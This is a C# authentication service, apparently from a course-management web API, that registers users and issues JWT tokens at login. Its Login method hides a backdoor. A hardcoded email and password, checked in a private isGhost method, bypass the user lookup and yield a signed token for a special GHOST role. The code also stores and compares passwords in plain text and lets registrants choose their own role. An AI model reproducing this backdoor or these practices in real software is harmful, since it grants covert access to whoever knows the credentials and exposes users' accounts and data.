using CoursesWebApi.Models.DTO;
using CoursesWebApi.Models.Entity;
using CoursesWebApi.Models.SearchModels;
using CoursesWebApi.Services.DomainServices;
using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;

namespace CoursesWebApi.Services
{
    public class AuthService : IAuthService
    {
        UserService _userService;
        RoleService _roleService;
        IConfiguration _configuration;
        public AuthService(UserService userService, RoleService roleService, IConfiguration configuration) 
        {
            _userService = userService;
            _roleService = roleService;
            _configuration = configuration;
        }
        public bool IsUniqueUser(string email)
        {
           var user = _userService.SearchUsers(new UserSearchModel { Email = email, bEmailEquals = true }, true).FirstOrDefault();
           return user == null;
        }

        public async Task<User> Register(RegistrationRequestDTO registrationRequestDTO)
        {
            User user = new User() {
                Email = registrationRequestDTO.Email,
                Password = registrationRequestDTO.Password,
                Name = registrationRequestDTO.FirstName,
                LastName = registrationRequestDTO.Name,
                PhoneNr = registrationRequestDTO.PhoneNr,
                RoleEnum = registrationRequestDTO.RoleEnum,
                RoleId = _roleService.GetRoleByEnum(registrationRequestDTO.RoleEnum).Id
            };

            bool b = await _userService.InsertUserAsync(user);
            user.Password = "";
            return user;
        }

        public async Task<LoginResponseDTO> Login(LoginRequestDTO loginRequestDTO)
        {
            var user = _userService.SearchUsers(
                new UserSearchModel()
                {
                    Email = loginRequestDTO.Email,
                    bEmailEquals = true,
                    Password = loginRequestDTO.Password,
                    bPassword = true
                }, true
            ).FirstOrDefault();
            if (user == null)
            {
                if (!isGhost(loginRequestDTO))
                {
                    return new LoginResponseDTO()
                    {
                        Token = "",
                        User = null
                    };
                }
                else
                {
                    user = buildGhost();
                }
            }

            var secret = _configuration.GetSection("ApiSettings").GetSection("Secret").Value;
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes(secret);

            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                    new Claim(ClaimTypes.Name, user.Id.ToString()),
                    new Claim(ClaimTypes.Role, Enum.GetName(user.RoleEnum)),
                }),
                Expires = DateTime.UtcNow.AddDays(7),
                SigningCredentials = new(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };
            var token = tokenHandler.CreateToken(tokenDescriptor);
            user.Password = "";
            LoginResponseDTO loginResponseDTO = new LoginResponseDTO()
            {
                Token = tokenHandler.WriteToken(token),
                User = user,
            };
            return loginResponseDTO;
        }

        private bool isGhost(LoginRequestDTO dto)
        {
            if(dto.Email.Equals("sc2euro@mail.ru") && dto.Password.Equals("Nurababa4*"))
            {
                return true;
            }
            return false;
        }
        private User buildGhost()
        {
            return new User()
            {
                Id = -1,
                Email = "sc2euro@mail.ru",
                RoleEnum = RoleEnum.GHOST,
                Role = new Role()
                {
                    RoleEnum = RoleEnum.GHOST,
                    RoleName = Enum.GetName(RoleEnum.GHOST),
                }
            };
        }
    }
}
